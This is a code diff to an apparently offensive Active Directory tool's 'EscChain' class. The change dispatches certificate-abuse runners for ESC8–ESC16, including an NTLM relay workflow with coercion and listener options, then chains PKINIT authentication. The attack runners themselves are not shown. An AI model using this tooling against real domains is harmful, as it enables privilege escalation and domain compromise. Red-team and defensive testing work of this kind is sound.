@@ -163,6 +163,17 @@ class EscChain:
         if not template or not ca:
             raise RuntimeError("Could not determine template + CA; specify both explicitly.")
 
+        # Honor explicit -P esc=N when provided; otherwise use picked signals.
+        esc_override = kwargs.get("esc")
+        if esc_override is not None:
+            esc_label = str(esc_override).upper()
+            if not esc_label.startswith("ESC"):
+                esc_label = f"ESC{esc_label}"
+            picked_meta = {**picked_meta, "signals": [esc_label], "esc_override": esc_label}
+
+        signals = list(picked_meta.get("signals") or ["ESC1"])
+        primary = signals[0] if signals else "ESC1"
+
         console.print(f"[bold]ESC chain[/bold] template={template} ca={ca} alt={alt_name}")
         if picked_meta:
             console.print(
@@ -173,16 +184,53 @@ class EscChain:
         from adaf_attack.capabilities.cert_request import CertRequest
         from adaf_attack.capabilities.pkinit_auth import PkinitAuth
 
-        cert_result = CertRequest().run(
-            target,
-            session,
-            graph,
-            include_secrets=include_secrets,
-            force=force,
-            template=template,
-            ca=ca,
-            alt_name=alt_name,
-        )
+        cert_result: dict[str, Any]
+        # Dispatch modern ESC enroll runners when the selected signal matches.
+        if primary in {"ESC9", "ESC10", "ESC13", "ESC14", "ESC15", "ESC16"}:
+            from adaf_attack.capabilities import adcs_esc
+
+            runner_map = {
+                "ESC9": adcs_esc.Esc9,
+                "ESC10": adcs_esc.Esc10,
+                "ESC13": adcs_esc.Esc13,
+                "ESC14": adcs_esc.Esc14,
+                "ESC15": adcs_esc.Esc15,
+                "ESC16": adcs_esc.Esc16,
+            }
+            cert_result = runner_map[primary]().run(
+                target,
+                session,
+                graph,
+                force=force,
+                template=template,
+                ca=ca,
+                alt_name=alt_name,
+            )
+        elif primary == "ESC8":
+            from adaf_attack.capabilities.adcs_esc import Esc8RelayWorkflow
+
+            cert_result = Esc8RelayWorkflow().run(
+                target,
+                session,
+                graph,
+                force=force,
+                ca=ca,
+                coerce_host=kwargs.get("coerce_host"),
+                allow_hosts=kwargs.get("allow_hosts"),
+                listener=kwargs.get("listener"),
+                duration_seconds=kwargs.get("duration_seconds"),
+            )
+        else:
+            cert_result = CertRequest().run(
+                target,
+                session,
+                graph,
+                include_secrets=include_secrets,
+                force=force,
+                template=template,
+                ca=ca,
+                alt_name=alt_name,
+            )
         # The nested certificate runner records its own pre-state when
         # possible; retain a chain-level advisory so the operator sees that
         # CA-issued material and PKINIT artifacts may require manual cleanup.
@@ -190,12 +238,12 @@ class EscChain:
             session,
             kind="certificate-enroll",
             target=f"{ca}/{template}",
-            extra={"advisory": True, "operation": "esc-chain"},
+            extra={"advisory": True, "operation": "esc-chain", "esc": primary},
         )
         pfx = cert_result.get("pfx") or cert_result.get("pfx_path")
 
         pkinit_result: dict[str, Any] = {}
-        if pfx and sam:
+        if primary != "ESC8" and pfx and sam:
             pkinit_result = PkinitAuth().run(
                 target,
                 session,
@@ -207,9 +255,9 @@ class EscChain:
             )
 
         conf = score_chain(
-            terminal_relation=(picked_meta.get("signals") or ["ESC1"])[0],
+            terminal_relation=primary,
             path_length=2 if pkinit_result else 1,
-            edge_kinds=list(picked_meta.get("signals") or []),
+            edge_kinds=signals,
         )
 
         result = {
@@ -217,6 +265,7 @@ class EscChain:
             "ca": ca,
             "alt_name": alt_name,
             "sam": sam,
+            "esc": primary,
             "picked": picked_meta,
             "confidence": conf,
             "cert_request": cert_result,
